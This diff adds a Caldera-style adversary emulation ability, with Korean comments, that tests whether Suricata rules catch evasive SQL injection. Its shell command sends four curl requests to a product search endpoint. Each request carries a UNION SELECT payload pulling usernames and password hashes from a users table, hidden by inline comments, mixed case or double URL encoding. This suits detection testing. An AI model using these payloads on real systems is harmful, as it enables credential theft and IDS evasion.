@@ -1,0 +1,47 @@
+- id: 44d5e6f7-8a9b-4012-bdef-012345678004
+  name: SQL Injection - Evasion Variants
+  description: UNION SELECT 공격을 다양한 우회 기법으로 시도하여 Suricata 룰의 우회 가능성을 검증합니다. Comment 삽입, Case 혼합, URL 이중 인코딩, 공백→주석 변형의 4가지 패턴을 순차 실행합니다.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1027.010
+    name: Obfuscated Files or Information - Command Obfuscation
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1027.010"
+          ABILITY_ID="44d5e6f7-8a9b-4012-bdef-012345678004"
+          TARGET="http://#{target.url}"
+
+          CURL_BASE=( -s -w " HTTP=%{http_code}\n"
+                      -H "X-Caldera-Op-Id: ${OP_ID}"
+                      -H "X-Caldera-Technique: ${TECH_ID}"
+                      -H "X-Caldera-Ability: ${ABILITY_ID}"
+                      -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" )
+
+          echo "[*] SQLi Evasion 시나리오 (4종)"
+          echo ""
+
+          # 페이로드 컬럼 5개 정렬 (products 테이블 컬럼 수에 맞춤)
+          # → BadSqlGrammar 회피 후 bcrypt 해시 노출 → UNION_DATA_LEAKED 트리거
+          # PG 호환: 키워드는 무결, 공백 자리에만 주석 삽입
+
+          echo "[1] 키워드 사이 주석: UNION /*foo*/ SELECT"
+          curl "${CURL_BASE[@]}" -o /dev/null \
+            "${TARGET}/api/products/search?keyword=%27+UNION+/*foo*/+SELECT+id%2Cusername%2Cpassword%2C0%2C0+FROM+users--"
+
+          echo "[2] Case 혼합: UnIoN SeLeCt"
+          curl "${CURL_BASE[@]}" -o /dev/null \
+            "${TARGET}/api/products/search?keyword=%27+UnIoN+SeLeCt+id%2Cusername%2Cpassword%2C0%2C0+FROM+users--"
+
+          echo "[3] URL 이중 인코딩: %2527 (디코딩 후 %27 → ')"
+          curl "${CURL_BASE[@]}" -o /dev/null \
+            "${TARGET}/api/products/search?keyword=%2527+UNION+SELECT+id%2Cusername%2Cpassword%2C0%2C0+FROM+users--"
+
+          echo "[4] 모든 공백을 주석으로 치환: UNION /*x*/ SELECT /*x*/ ..."
+          curl "${CURL_BASE[@]}" -o /dev/null \
+            "${TARGET}/api/products/search?keyword=%27+UNION+/*x*/+SELECT+/*x*/+id%2Cusername%2Cpassword%2C0%2C0+/*x*/+FROM+/*x*/+users--"
+
+          echo ""
+          echo "[*] Evasion 종료 — Suricata SID별 발동 여부 확인"
